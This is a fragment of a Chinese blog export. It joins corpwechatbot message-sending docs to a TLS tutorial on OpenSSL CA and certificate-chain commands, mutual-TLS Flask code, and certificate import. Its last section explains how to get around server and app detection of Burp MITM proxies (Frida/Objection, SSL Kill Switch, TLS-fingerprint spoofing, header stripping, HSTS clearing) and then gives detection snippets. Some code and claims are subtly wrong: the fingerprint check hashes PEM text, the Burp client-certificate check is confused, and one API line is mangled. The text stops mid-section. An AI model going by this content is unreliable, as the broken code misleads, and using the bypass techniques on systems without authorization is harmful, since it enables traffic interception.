corpsecret=&#x27;&#x27;,  # 你的应用凭证密钥                agentid=&#x27;&#x27;, # 你的应用id                log_level=cptools.INFO, # 设置日志发送等级，INFO, ERROR, WARNING, CRITICAL,可选                proxies=&#123;&#x27;http&#x27;:&#x27;http:example.com&#x27;, &#x27;https&#x27;:&#x27;https:example.com&#x27;&#125;  # 设置代理，可选                )   # 如果你在本地配置添加了企业微信本地配置文件，也可以直接初始化AppMsgSender，而无需再显式传入密钥参数# app = AppMsgSender()\n\n 在v0.3.0之后，你可以创建多个AppMsgSender，以实现通过多个不同的应用的消息发送，这让你可以实现在一个项目中跨用户、跨企业的消息通知，下面是一个例子\n app1 = AppMsgSender(corpid=&#x27;1&#x27;,  # 你的企业id                corpsecret=&#x27;1&#x27;,  # 你的应用凭证密钥                agentid=&#x27;1&#x27;)   # 你的应用idapp2 = AppMsgSender(corpid=&#x27;2&#x27;,  # 你的企业id                corpsecret=&#x27;2&#x27;,  # 你的应用凭证密钥                agentid=&#x27;2&#x27;)   # 你的应用idapp1.send_text(&#x27;App1的消息&#x27;) app2.send_text(&#x27;App2的消息&#x27;)\n 完成实例创建之后，你可以通过接口实现需要的信息推送，具体包括：\n\n文本消息 最普通的消息，文字内容，最长不超过2048个字节\n app.send_text(content=&quot;如果我是DJ，你会爱我吗？&quot;)\n\n图片消息 发送一张图片，可选jpg,png，大小不超过2MB，目前仅支持通过图片路径发送.\n app.send_&#x2F;img&#x2F;picture&#x2F;pythonWXWapi&#x2F;image(&#x2F;img&#x2F;picture&#x2F;pythonWXWapi&#x2F;image_path&#x3D;’test.png’)  # 图片存储路径 img.png\n\n语音消息 发送一条语音，大小不超过2MB，时长不超过60s，必须是.amr格式\n app.send_voice(voice_path&#x3D;’test.amr’) img_1.png\n\n视频消息 发送一段视频，大小不超过10MB，必须是.mp4格式\n app.send_video(video_path&#x3D;’test.mp4’) img_2.png\n\n普通文件其他类型的文件，大小不超过20MB（不小于5字节）\n\n\napp.send_file(file_path=&#39;test.txt&#39;)\n\nmarkdown消息markdown类型消息，支持markdown语法，目前仅支持企业微信查看，若输入内容以.md结尾，则会尝试读取对应文件内容发送。\n\napp.send_markdown(content&#x3D;’# 面对困难的秘诀 \\n &gt; 加油，奥利给！’)\n\n图文消息 图片+文字描述+跳转链接，目前仅支持企业微信查看\n app.send_news(title=&#x27;性感刘公，在线征婚&#x27;,            desp=&#x27;刘公居然要征婚了？这到底是人性的扭曲，还是道德的沦丧？...&#x27;,            url=&#x27;https://blog.gentlecp.com&#x27;,            picurl=&#x27;https://gitee.com/gentlecp/ImgUrl/raw/master/20210313141425.jpg&#x27;)\n\n\nmpnews图文消息该图文消息相比于上一个允许更丰富的表达，接受html语法，更多区别请参考官方文档\napp.send_mpnews(title=&#x27;你好，我是CP&#x27;,            /img/picture/pythonWXWapi/image_path=&#x27;data/test.png&#x27;,            content=&#x27;&lt;a href=&quot;https://blog.gentlecp.com&quot;&gt;Hello World&lt;/a&gt;&#x27;,            content_source_url=&#x27;https://blog.gentlecp.com&#x27;,            author=&#x27;GentleCP&#x27;,            digest=&#x27;这是一段描述&#x27;,            safe=1)\n\n卡片消息发送一张卡片，带有跳转链接\napp.send_card(title=&#x27;真骚哥出柜&#x27;,            desp=&#x27;真骚哥竟然出柜了？对象竟然是他...&#x27;,            url=&#x27;https://blog.gentlecp.com&#x27;,            btntxt=&#x27;一睹为快&#x27;)\n\n\n任务卡片消息任务发片消息实现用户对服务端的消息进行相应的反馈，如接收到通知后，执行相应操作（如重启）\n在发送应用卡片消息之前，请确保你已做好相应的回调配置\nbtn = [&#123;&quot;key&quot;: &quot;yes&quot;,&quot;name&quot;: &quot;好的&quot;,&quot;color&quot;:&quot;red&quot;,&quot;is_bold&quot;: True,&#125;,&#123;    &quot;key&quot;: &quot;no&quot;,    &quot;name&quot;: &quot;wdnmd&quot;&#125;]app.send_taskcard(title=&quot;老板的消息&quot;,                desp=&quot;下个月工资减半&quot;,                url=&quot;http://127.0.0.1&quot;,                btn=btn,                task_id=&#x27;12323&#x27;,) # task_id在应用中是唯一的\n\n更多参数使用上面只是简单地列出了每个消息推送接口的使用，对于一般使用已经足够了，如果你还有更细致的要求，例如发送给指定人，消息安全性等，需要配置以下参数：\n所有应用推送消息有几个共同参数，用于指定发送消息的特性，如下\ntouser: 要发送的用户，通过列表划分，输入成员ID，默认发送给全体toparty: 要发送的部门，通过列表划分，输入部门ID，当touser为@all时忽略totag: 发送给包含指定标签的人，通过列表划分，输入标签ID，当touser为@all时忽略safe(该参数并非所有接口都支持，使用时请确认): 是否是保密消息，0表示可对外分享，1表示不能分享且内容显示水印，默认为0\n一个演示程序from corpwechatbot.app import AppMsgSenderapp = AppMsgSender(corpid=&#x27;&#x27;,  # 你的企业id                corpsecret=&#x27;&#x27;,  # 你的应用凭证密钥                agentid=&#x27;&#x27;)   # 你的应用idapp.send_text(content=&#x27;Hello&#x27;,            touser=[&#x27;sb&#x27;],            toparty=[&#x27;1&#x27;],            totag=[&#x27;1&#x27;],            safe=1)\n⚠️注意！在指定toparty参数的时候，请确保你应用的可见范围包括该部门，否则会发送失败！很多失败情况都是应用的可见范围没设置正确导致！！ \n获取相关用户数据方法进入企业微信后台-&gt;通讯录\n\n\n","categories":["技术","企业微信项目"]},{"title":"tls学习","url":"/2025/04/14/%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/tls%E5%AD%A6%E4%B9%A0/","content":"双向tls认证定义双向tls是指在进行https认证的时候服务器和客户端都会彼此进行证书认证, 需要使用一个ca对客户端和服务端进行证书签发. 本次项目实现会使用Flask来进行部署\n后端代码from flask import Flask, request, g, jsonifyfrom OpenSSL import cryptoimport sslapp = Flask(__name__)# 全局解析客户端证书@app.before_requestdef parse_client_cert():    # 检查是否启用 TLS 且客户端提供了证书    if not request.is_secure:        return jsonify(&#123;&quot;error&quot;: &quot;HTTPS required&quot;&#125;), 400    client_cert_pem = request.environ.get(&#x27;SSL_CLIENT_CERT&#x27;)    if not client_cert_pem:        return jsonify(&#123;&quot;error&quot;: &quot;Client certificate required&quot;&#125;), 403    try:        # 解析证书内容        cert = crypto.load_certificate(crypto.FILETYPE_PEM, client_cert_pem)        subject = cert.get_subject()        issuer = cert.get_issuer()        # 将证书信息存储在全局对象 g 中        g.client_cert = &#123;            &quot;common_name&quot;: subject.CN,            &quot;organization&quot;: subject.O,            &quot;issuer&quot;: issuer.CN,            &quot;expiry&quot;: cert.get_notAfter().decode(&#x27;utf-8&#x27;),            &quot;serial&quot;: cert.get_serial_number(),        &#125;    except Exception as e:        app.logger.error(f&quot;Failed to parse client certificate: &#123;str(e)&#125;&quot;)        return jsonify(&#123;&quot;error&quot;: &quot;Invalid client certificate&quot;&#125;), 403# 示例路由@app.route(&quot;/api/data&quot;)def get_data():    # 直接使用 g.client_cert 中的信息    return jsonify(&#123;        &quot;data&quot;: &quot;Sensitive information&quot;,        &quot;client&quot;: g.client_cert[&quot;common_name&quot;]    &#125;)@app.route(&quot;/api/user&quot;)def get_user():    # 另一个路由同样可以访问证书信息    return jsonify(&#123;&quot;user&quot;: g.client_cert[&quot;common_name&quot;]&#125;)if __name__ == &quot;__main__&quot;:    # 配置双向 TLS    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)    context.load_cert_chain(certfile=&quot;./server/server.crt&quot;, keyfile=&quot;./server/server.key&quot;)    context.load_verify_locations(cafile=&quot;./ca/ca.crt&quot;)  # 指定信任的 CA（用于验证客户端证书）    context.verify_mode = ssl.CERT_REQUIRED  # 强制要求客户端提供有效证书    app.run(host=&quot;0.0.0.0&quot;, port=5000, ssl_context=context, debug=False)\n\n\n\n\n证书生成常规部署\n必须共享的文件：\nCA公钥证书（ca.crt） - 需要分发给所有验证方\n签发好的终端证书（server.crt&#x2F;client.crt） - 给对应设备使用\n\n\n必须保密的内容：\nCA私钥（ca.key） - 一旦泄露整个信任体系崩溃\n所有终端私钥（server.key&#x2F;client.key）\n\n\n\n\n多设备部署实例\n假设有三台机器：\n\nCA服务器（安全环境）\n生成：ca.key + ca.crt\n只分发ca.crt给其他机器\n\n\nWeb服务器\n生成：server.key + server.csr\n将server.csr发送给CA签发\n获得：server.crt\n最终保留：server.key + server.crt + ca.crt\n\n\n客户端设备\n生成：client.key + client.csr\n将client.csr发送给CA签发\n获得：client.crt\n最终保留：client.key + client.crt + ca.crt\n\n\n\n概念分类\n\n\n扩展名\n类型\n格式\n包含内容\n典型用途\n\n\n\n.key\n私钥\nPEM\n私钥\n服务器配置\n\n\n.crt/.cer\n证书\nPEM&#x2F;DER\n公钥+CA签名\nHTTPS 服务端证书\n\n\n.csr\n证书签名请求\nPEM\n公钥+身份信息\n向 CA 申请证书\n\n\n.pem\n通用容器\nPEM\n证书&#x2F;私钥&#x2F;公钥\nUnix 系统通用格式\n\n\n.der\n二进制证书&#x2F;密钥\nDER\n二进制编码数据\nWindows 系统\n\n\n.pfx\n密钥库\nPKCS#12\n私钥+证书+证书链\nIIS&#x2F;Java 应用\n\n\n.jks\nJava 密钥库\n二进制\n私钥+证书（Java 专用）\nTomcat&#x2F;Java 应用\n\n\n.crl\n证书吊销列表\nPEM&#x2F;DER\n吊销的证书序列号\n安全策略实施\n\n\nkey 私钥文件格式通常为: key&#x2F;pem&#x2F;der, key和pem的区别较小,但是仍然存在区别\n\n\n\n特性\n.key 文件\n.pem 文件\n\n\n\n主要用途\n通常专门存储私钥\n通用容器，可存储证书&#x2F;私钥&#x2F;公钥等\n\n\n内容范围\n仅私钥（多数情况）\n可能包含证书、私钥、公钥或组合\n\n\n文件结构\n无强制要求，但通常为 PEM 格式\n必须有 BEGIN/END 标签\n\n\n典型内容\n-----BEGIN PRIVATE KEY-----\n可能是私钥、证书或两者\n\n\n\n\n\n特性\nPEM 格式\nDER 格式\nPKCS#12 (.pfx)\n\n\n\n编码方式\nBase64 文本(同key) + ASCII 标签\n二进制 ASN.1\n二进制 PKCS#12 结构\n\n\n可读性\n可用文本编辑器查看\n二进制乱码\n二进制乱码\n\n\n文件大小\n较大（Base64 膨胀约 33%）\n较小\n中等（含多个对象）\n\n\n密码保护\n可加密（单独私钥）\n不支持\n必须设置密码\n\n\n系统兼容性\nUnix&#x2F;Linux&#x2F;Web 服务器\nWindows&#x2F;Java\nWindows IIS&#x2F;Java Keystore\n\n\n典型扩展名\n.pem, .crt, .key\n.der, .cer\n.pfx, .p12\n\n\n多对象支持\n可拼接多个证书&#x2F;密钥\n单对象文件\n支持多证书+私钥打包\n\n\n证书签发生成 CA 私钥和根证书openssl genrsa -out ca.key 2048openssl req -new -x509 -days 365 -key ca.key -out ca.crt -subj &quot;/CN=MyCA&quot;\n\n生成服务器证书openssl genrsa -out server.key 2048openssl req -new -key server.key -out server.csr -subj &quot;/CN=localhost&quot;openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt -days 365\n\n生成客户端证书openssl genrsa -out client.key 2048openssl req -new -key client.key -out client.csr -subj &quot;/CN=client&quot;openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out client.crt -days 365\n\n\n\n生成 CA 私钥和根证书生成 CA 私钥\nopenssl genrsa -out ca.key 2048\n\n\n\n\n参数\n作用\n\n\n\ngenrsa\n生成 RSA 私钥的命令\n\n\n-out\n指定输出文件名（此处为 ca.key）\n\n\n2048\n密钥长度（位），2048 是当前安全标准的最小推荐值\n\n\n生成自签名根证书openssl req -new -x509 -days 365 -key ca.key -out ca.crt -subj &quot;/CN=MyCA&quot;\n\n\n\n\n参数\n作用\n\n\n\nreq\n证书请求命令\n\n\n-new\n创建新请求\n\n\n-x509\n直接输出 X.509 证书（用于创建自签名证书）\n\n\n-days 365\n证书有效期（天）\n\n\n-key\n指定私钥文件（用于签名证书）\n\n\n-out\n输出证书文件\n\n\n-subj\n指定证书主题（Subject），/CN=MyCA 设置通用名（CA 的标识名）\n\n\n\n生成服务器证书生成服务器私钥\nopenssl genrsa -out server.key 2048\n\n（参数同 CA 私钥生成）\n创建证书签名请求 (CSR)\nopenssl req -new -key server.key -out server.csr -subj &quot;/CN=localhost&quot;\n\n\n\n\n参数\n作用\n\n\n\n-key\n指定服务器私钥文件\n\n\n-out\n输出 CSR 文件\n\n\n-subj\n设置服务器标识，/CN=localhost 表示该证书用于 localhost 域名\n\n\n用 CA 签发服务器证书\nopenssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt -days 365\n\n\n\n\n参数\n作用\n\n\n\nx509\n证书操作命令\n\n\n-req\n输入是 CSR 文件\n\n\n-in\n指定输入的 CSR 文件\n\n\n-CA\n指定 CA 的证书文件\n\n\n-CAkey\n指定 CA 的私钥文件\n\n\n-CAcreateserial\n自动创建&#x2F;更新序列号文件（ca.srl，用于避免证书序列号重复）\n\n\n-out\n输出签发的证书文件\n\n\n-days 365\n证书有效期\n\n\n\n生成客户端证书生成客户端私钥\nopenssl genrsa -out client.key 2048\n\n\n\n创建客户端 CSR\nopenssl req -new -key client.key -out client.csr -subj &quot;/CN=client&quot;\n\n\n\n\n参数\n关键区别\n\n\n\n-subj\n此处 /CN=client 表示这是客户端证书，标识客户端身份（不同于服务器证书）\n\n\n用 CA 签发客户端证书\nopenssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out client.crt -days 365\n\n（参数与服务器证书签发完全相同）\n\n关键参数深度解析关于 -subj 字段完整的 Subject 可包含更多信息（用 / 分隔）：\n-subj &quot;/C=CN/ST=Beijing/L=Haidian/O=My Company/OU=Dev/CN=example.com&quot;\n\n\n\n\n字段\n含义\n示例值\n\n\n\nC\n国家（Country）\nCN\n\n\nST\n州&#x2F;省（State）\nBeijing\n\n\nL\n城市（Locality）\nHaidian\n\n\nO\n组织（Organization）\nMy Company\n\n\nOU\n部门（Organizational Unit）\nDev\n\n\nCN\n通用名（Common Name）\nexample.com\n\n\n\n关于 -CAcreateserial\n首次运行时会创建 ca.srl 文件（包含十六进制序列号，如 01）\n\n后续签发证书时序列号会自动递增，OpenSSL 会读取并更新其中的值。\n\n.srl 文件是 证书序列号文件（Serial Number File），主要用于 OpenSSL 在签发证书时跟踪已使用的序列号，避免重复。以下是详细解析：\n\n.srl 的作用\n\n记录序列号：存储一个十六进制数值（如 00 或随机数），作为证书的唯一标识。\n防重复：每次签发新证书时，OpenSSL 会读取 .srl 中的值并递增，确保每个证书的序列号唯一。\n场景：在 CA（证书颁发机构） 或自签名证书过程中自动生成。\n\n\n也可手动指定序列号文件：\n-CAserial ca.srl\n\n\n\n注意事项\n\n文件位置：\n\n通常与 CA 证书（ca.crt）和私钥（ca.key）放在同一目录。\n\n可通过 -CAserial 指定自定义路径。\n\n\n\n手动修改风险：\n\n直接编辑 .srl 可能导致序列号冲突（如重复或跳跃），建议由 OpenSSL 自动管理。\n\n\n非必要文件：\n\n如果仅签发少量证书，可用 -CAcreateserial 替代，无需长期维护 .srl。\n\n\n\n\n\n\n关于密钥长度（2048）\n2048-bit RSA：当前最低安全标准（有效期建议 ≤ 3 年）\n3072&#x2F;4096-bit：更高安全性（但性能略有下降）\n过时的 1024-bit：已不安全，应避免使用\n\n常见问题解答Q1: 为什么需要 -x509 参数生成 CA 证书？A1: -x509 表示直接生成自签名证书（CA 证书不需要被其他机构签名）。\nQ2: -CAcreateserial 不写会怎样？A2: 必须手动通过 -set_serial 指定序列号，否则报错（自动管理更安全方便）。\nQ3: 证书有效期可以超过 1 年吗？A3: 可以（如 -days 3650 表示 10 年），但超过 825 天的证书会被 Chrome&#x2F;Firefox 标记为不安全。\nQ4: 如何查看生成的证书内容？\nopenssl x509 -in server.crt -text -noout\n\n掌握这些参数后，您可以根据实际需求灵活调整证书生成流程！\n证书链签发模拟在 HTTPS 中签发证书链（Certificate Chain），类似于学校层级（校长 → 学院 → 导员 → 学生），本质是构建一个**层级化的 PKI（公钥基础设施）**体系。以下是具体步骤和实现方法：\n\n1. 证书链的核心逻辑\n层级关系：上级证书（CA）签发下级证书，形成信任链。\n\n\n\n  示例结构\n  ：\n  根CA（自签名，校长） → 中间CA（学院） → 中间CA（导员） → 终端证书（学生）\n\n\n验证流程：浏览器会从终端证书逐级回溯验证，直到信任的根CA。\n\n\n2. 具体操作步骤（以 OpenSSL 为例）步骤 1：创建根CA（校长）bash\n复制\n# 生成根CA私钥openssl genrsa -out rootCA.key 4096# 自签名根CA证书（有效期10年）openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 3650 -out rootCA.crt\n\n\n关键参数：-x509 表示自签名，根CA无需被其他证书签发。\n\n步骤 2：创建中间CA（学院）bash\n复制\n# 生成中间CA私钥openssl genrsa -out collegeCA.key 2048# 生成中间CA的CSR（证书签名请求）openssl req -new -key collegeCA.key -out collegeCA.csr# 用根CA签发中间CA证书openssl x509 -req -in collegeCA.csr -CA rootCA.crt -CAkey rootCA.key -CAcreateserial -out collegeCA.crt -days 1825 -sha256\n\n步骤 3：创建二级中间CA（导员）bash\n复制\n# 生成导员CA私钥openssl genrsa -out teacherCA.key 2048# 生成导员CA的CSRopenssl req -new -key teacherCA.key -out teacherCA.csr# 用学院导员CA证书openssl x509 -req -in teacherCA.csr -CA collegeCA.crt -CAkey collegeCA.key -CAcreateserial -out teacherCA.crt -days 1825 -sha256\n\n步骤 4：签发终端证书（学生）# 生成学生私钥openssl genrsa -out student.key 2048# 生成学生的CSRopenssl req -new -key student.key -out student.csr# 用导员CA签发学生证书openssl x509 -req -in student.csr -CA teacherCA.crt -CAkey teacherCA.key -CAcreateserial -out student.crt -days 365 -sha256\n\n\n3. 证书链的合并与部署合并证书链（PEM 格式）cat student.crt teacherCA.crt collegeCA.crt &gt; chain.crt\n\n\n作用：将终端证书和所有中间CA证书按顺序合并，供服务器（如Nginx）使用。\n\nNginx 配置示例server &#123;    ssl_certificate     /path/to/chain.crt;  # 包含完整证书链    ssl_certificate_key /path/to/student.key;&#125;\n\n验证证书链有效性openssl verify -CAfile rootCA.crt -untrusted chain.crt student.crt\n\n\n输出 OK 表示链完整且可被信任。\n\n\n4. 关键注意事项\n根CA的保密性\n\n根CA私钥（rootCA.key）必须离线存储，仅用于签发中间CA。\n\n\n中间CA的生命周期\n\n中间CA证书的有效期应短于根CA（如根CA10年，中间CA5年）。\n\n\n证书吊销列表（CRL&#x2F;OCSP）\n\n层级化CA需配置吊销机制，防止下级证书被滥用：\n# 生成CRL（证书吊销列表）openssl ca -gencrl -keyfile rootCA.key -cert rootCA.crt -out rootCA.crl\n\n\n浏览器信任问题\n\n自签名的根CA需手动导入到操作系统&#x2F;浏览器的信任存储中，否则会显示警告。\n\n\n\n\n5. 实际应用场景学校内网HTTPS\n校长（根CA）：签发学院CA证书。\n学院（中间CA）：签发各系&#x2F;导员的子CA证书。\n导员（终端CA）：为学生或设备签发终端证书。\n学生：使用证书登录内网系统或加密通信。\n\n企业级PKI\n类似逻辑可扩展至企业部门、云服务多租户等场景。\n\n\n总结\n层级化签发：通过根CA → 中间CA → 终端证书构建信任链。\n核心工具：OpenSSL 的 req、x509 和 ca 命令。\n安全要点：保护根CA私钥、控制中间CA权限、合并完整证书链。\n\n通过这种结构，可以模拟学校层级的证书签发体系，同时满足HTTPS对证书链的验证需求。\n通过命令生成的证书导入不同平台生成客户端证书openssl genrsa -out client.key 2048openssl req -new -key client.key -out client.csr -subj &quot;/CN=client&quot;openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out client.crt -days 365\n\n\n\n明白了！你只有通过以下命令生成的 client.key（私钥） 和 client.crt（证书），没有 .p12 或 .pfx 文件。以下是直接使用 .crt + .key 在不同平台导入的方法：\n\n1. 通用准备将证书和私钥合并为 PEM 格式（部分平台需要）：\ncat client.crt client.key &gt; client.pem\n\n\n2. 各平台导入方法Windows方法1：手动导入 .crt 和 .key\n导入证书（.crt）\n双击 client.crt → 选择 本地计算机 或 当前用户 → 存储位置选 个人。\n\n\n关联私钥（.key）\n需要将 .key 转换为 .pfx（见下文），或通过代码（如C#）直接加载文件。\n\n\n\n方法2：转换为 .pfx 再导入（推荐）bash\n复制\nopenssl pkcs12 -export -in client.crt -inkey client.key -out client.pfx -password pass:123456\n\n\n双击生成的 client.pfx，按向导导入即可。\n\n\nLinux方法1：直接使用文件（适用于命令行工具）\ncurl&#x2F;wget\ncurl --cert client.crt --key client.key https://your-server.com\n\nNginx&#x2F;Apache：在配置中指定路径：\nssl_certificate     /path/to/client.crt;ssl_certificate_key /path/to/client.key;\n\n方法2：系统级信任（可选）# 将CA证书（ca.crt）加入系统信任sudo cp ca.crt /usr/local/share/ca-certificates/sudo update-ca-certificates\n\n\nAndroid方法1：通过代码加载（适用于App开发）kotlin\n// 加载 PEM 格式的证书和私钥val certificate = File(&quot;client.pem&quot;).readBytes()val key = File(&quot;client.key&quot;).readBytes()\n\n方法2：转换为 .p12 后导入openssl pkcs12 -export -in client.crt -inkey client.key -out client.p12 -password pass:123456\n\n\n将 client.p12 传输到手机 → 进入 设置 → 安全 → 从存储设备安装。\n\n\niOS&#x2F;macOS方法1：邮件或AirDrop发送 .pem\n将 client.pem 发送到设备 → 点击附件安装。\n输入密码（如果有）→ 信任证书（需在 设置 → 通用 → 关于 → 证书信任设置 中启用）。\n\n方法2：转换为 .p12 后导入openssl pkcs12 -export -in client.crt -inkey client.key -out client.p12 -password pass:123456\n\n\n通过邮件发送 .p12 → 在iOS上点击安装。\n\n\n3. 关键注意事项\n私钥保护：\n.key 文件必须严格保密，建议转换为密码保护的 .p12 后再分发。\n\n\n格式兼容性：\nWindows&#x2F;iOS 更依赖 .pfx&#x2F;.p12，Linux&#x2F;Android 可直接使用 .crt + .key。\n\n\nCA信任：\n确保设备的信任存储中已导入你的 ca.crt（根证书），否则会报错。\n\n\n\n\n4. 验证是否导入成功\nWindows：运行 certmgr.msc，查看 个人 证书列表。\n\nLinux：使用 \nopenssl\n\n命令测试：\nopenssl s_client -connect your-server:443 -cert client.crt -key client.key -CAfile ca.crt\n\niOS&#x2F;Android：尝试访问HTTPS服务，检查是否弹出证书选择框。\n\n\n\n总结\n最佳实践：优先转换为 .p12&#x2F;.pfx 格式（密码保护），兼容所有平台。\n直接使用场景：Linux&#x2F;Android 可直接操作 .crt + .key 文件。\n安全提醒：私钥（.key）绝不能明文传输！\n\nburp导入的证书** 根证书（CA Certificate）**\n文件格式：.cer、.pem、.der（Burp Suite 默认导出 .cer 或 .pem）\n作用：\nBurp Suite 会生成一个 自签名的根CA证书（如 PortSwigger CA）。\n设备信任该证书后，Burp Suite 可以动态签发任意域名的 伪造证书（用于解密HTTPS流量）。\n\n\n如何获取：\nBurp Suite：访问 http://burpsuite → 下载 cacert.der 或 cacert.pem。\nFiddler：访问 http://127.0.0.1:8888 → 下载 FiddlerRoot.cer。\n\n\n\n**  动态生成的站点证书**\n生成方式：\n\n当你访问 https://example.com 时，Burp Suite 会用它的根CA签发一个伪造的 example.com 证书。\n该证书的 公钥 由 Burp Suite 控制，因此可以解密流量。\n\n\n证书链：\n伪造的 example.com 证书 ← Burp Suite 根CA证书\n\n如何绕过服务器对burp等mitm代理检测1. 证书固定（Certificate Pinning）原理\n服务器或客户端（如App）会预先存储合法的证书公钥或CA信息，仅信任特定的证书链。\n当你使用Burp Suite代理时，Burp会动态生成伪造的证书（由 PortSwigger CA 签发），但客户端&#x2F;服务器发现证书不匹配，就会拒绝连接。\n\n如何检测\nHTTP公钥固定（HPKP）（已弃用，但部分系统仍支持）：\nPublic-Key-Pins: pin-sha256=&quot;base64==&quot;; max-age=5184000\n\nAndroid&#x2F;iOS App 内置证书：\n\n许多App（如银行、支付类）硬编码了合法证书的指纹，Burp的伪造证书无法通过验证。\n\n\n\n绕过方法（仅限授权测试）\nAndroid：使用 Frida 或 Objection 钩子（Hook）证书检查逻辑。\niOS：越狱后使用 SSL Kill Switch 禁用证书固定。\n浏览器：手动删除HPKP头或修改HSTS策略（Chrome DevTools）。\n\n\n2. TLS指纹检测（JA3&#x2F;JA3S）原理\nBurp Suite 的TLS握手行为（如支持的加密套件、扩展）与正常浏览器&#x2F;客户端不同，服务器可以通过 JA3指纹 识别异常。\n例如：\nBurp默认使用 TLS_RSA_WITH_AES_128_CBC_SHA（较弱的套件）。\n现代浏览器使用 TLS_AES_128_GCM_SHA256（TLS 1.3）。\n\n\n\n如何检测\n服务器分析客户端的TLS握手包，匹配已知代理工具的指纹库（如Burp、Fiddler、Charles）。\n\n绕过方法\n修改Burp的TLS指纹：\n\n使用插件（如 Bypass TLS Fingerprinting）模拟浏览器指纹。\n手动配置Burp的TLS套件（需修改Burp源码）。\n\n\n使用真实浏览器代理：\n\n通过 Chrome + SwitchyOmega 转发流量到Burp，保留浏览器原生TLS行为。\n\n\n\n\n3. HTTP头检测原理\nBurp Suite 默认会在请求中添加或修改某些HTTP头，例如：\nVia: 1.1 burp（显式暴露代理）。\nX-Forwarded-For: 127.0.0.1（可能被服务器标记）。\n\n\n服务器检查这些头字段，发现异常后拦截请求。\n\n如何检测GET / HTTP/1.1Host: example.comVia: 1.1 burp  # ← 服务器识别到Burp的标记\n\n绕过方法\nBurp Suite 配置：\n\n进入 Proxy → Options → Match and Replace，删除或修改敏感头字段。\n\n\n禁用 Support invisible proxying 避免自动添加头。\n\n\n\n4. IP&#x2F;行为异常检测原理\nIP信誉库：服务器发现请求来自已知代理&#x2F;VPN IP（如Burp默认的 127.0.0.1:8080）。\n请求频率异常：Burp的自动化扫描工具（如Intruder）会发送大量请求，触发风控。\n\n如何检测\n云服务商（如Cloudflare）会标记代理IP并返回 403 Forbidden。\n服务器监控请求速率，异常流量触发CAPTCHA或封禁。\n\n绕过方法\n使用真实IP：关闭Burp的全局代理，仅针对特定进程代理（如 Proxifier）。\n降低请求频率：在Burp的Intruder中设置延迟（Options → Request Throttle）。\n\n\n5. HSTS（HTTP严格传输安全）原理\n服务器响应头包含 Strict-Transport-Security，强制浏览器仅通过HTTPS访问。\n如果Burp的证书不受信任，浏览器会直接拒绝连接（无法降级到HTTP）。\n\n如何检测Strict-Transport-Security: max-age=31536000; includeSubDomains\n\n绕过方法\n清除浏览器HSTS缓存：\n\nChrome访问 chrome://net-internals/#hsts，删除域名记录。\n\n\n使用自定义Hosts文件：\n\n将目标域名解析到本地，强制HTTP访问（仅限测试环境）。\n\n\n\n\n总结：为什么服务器能发现Burp代理？\n\n\n检测手段\n原理\n绕过方法\n\n\n\n证书固定\n客户端&#x2F;服务器校验证书指纹\n修改客户端代码（Frida&#x2F;Objection）\n\n\nTLS指纹\n分析TLS握手行为（JA3&#x2F;JA3S）\n模拟浏览器指纹或使用真实浏览器代理\n\n\nHTTP头标记\n检测 Via、X-Forwarded-For 等头\n删除或替换敏感头字段\n\n\nIP&#x2F;行为风控\n代理IP或异常请求频率触发拦截\n降低扫描速率或使用真实IP\n\n\nHSTS\n强制HTTPS，阻止MITM降级攻击\n清除HSTS缓存或本地Hosts劫持\n\n\n防御MITM代理1. 检测方法(1) 检查客户端证书链（Certificate Chain）原理\n如果客户端信任了Burp的根证书（如 PortSwigger CA），它在TLS握手时会接受Burp签发的伪造证书。\n钓鱼服务器可以检查客户端提交的证书链，如果发现证书由 Burp Suite 的CA签发（而非合法CA如 Let’s Encrypt、DigiCert），则可判定存在代理。\n\n实现方式\n服务端代码示例（Node.js）：\nconst tls = require(&#x27;tls&#x27;);const server = tls.createServer(&#123;  key: serverKey,  cert: serverCert,  requestCert: true, // 要求客户端证书  rejectUnauthorized: false // 不强制验证客户端证书&#125;, (socket) =&gt; &#123;  const clientCert = socket.getPeerCertificate();  if (clientCert.issuer.CN === &#x27;PortSwigger CA&#x27;) &#123;    console.log(&#x27;[!] 检测到Burp证书:&#x27;, clientCert.subject.CN);  &#125;&#125;);server.listen(443);\n\n\n(2) 检查TLS指纹（JA3&#x2F;JA3S）原理\nBurp Suite 的TLS握手行为（如加密套件、扩展字段）与正常浏览器&#x2F;客户端不同，可通过 JA3指纹 识别。\n钓鱼服务器可以比对客户端的TLS指纹是否匹配已知代理工具（如Burp、Fiddler）。\n\n实现方式\n使用开源库（如 ja3）计算指纹：\nfrom ja3 import JA3# 捕获客户端TLS握手包，计算JA3指纹ja3_hash = JA3().calculate(packet)if ja3_hash in KNOWN_BURP_JA3_HASHES:    print(&quot;[!] 检测到Burp代理&quot;)\n\n\n(3) 检查HTTP请求头原理\nBurp Suite 默认会在HTTP请求中添加某些头字段（如 Via: 1.1 burp），或修改&#x2F;删除正常浏览器的头（如 User-Agent）。\n钓鱼服务器可检查这些异常标记。\n\n检测逻辑if &quot;Via&quot; in request.headers and &quot;burp&quot; in request.headers[&quot;Via&quot;]:    print(&quot;[!] 检测到Burp代理头&quot;)\n\n\n(4) 证书透明度日志（Certificate Transparency, CT）原理\n合法CA签发的证书会公开记录在 CT日志（如 crt.sh）。\nBurp Suite 的伪造证书不会出现在CT日志中，服务器可通过查询证书的序列号或域名判断是否为伪造。\n\n实现方式# 查询证书是否在CT日志中（例如使用 crt.sh API）curl &quot;https://crt.sh/?q=example.com&quot; | grep &quot;PortSwigger&quot;\n\n\n(5) 证书公钥指纹比对原理\n钓鱼服务器可预先存储目标域名的 合法证书公钥指纹（如SHA-256）。\n如果客户端提交的证书公钥指纹与合法证书不匹配，则可能被代理篡改。\n\n代码示例python\n复制\nimport hashlibdef check_cert_fingerprint(cert_pem):    pubkey = cert_pem.split(&quot;-----BEGIN CERTIFICATE-----&quot;)[1]    fingerprint = hashlib.sha256(pubkey.encode()).hexdigest()    if fingerprint != LEGIT_FINGERPRINT:        print(&quot;[!] 证书指纹不匹配，可能被Burp代理&quot;)\n\n\n2. 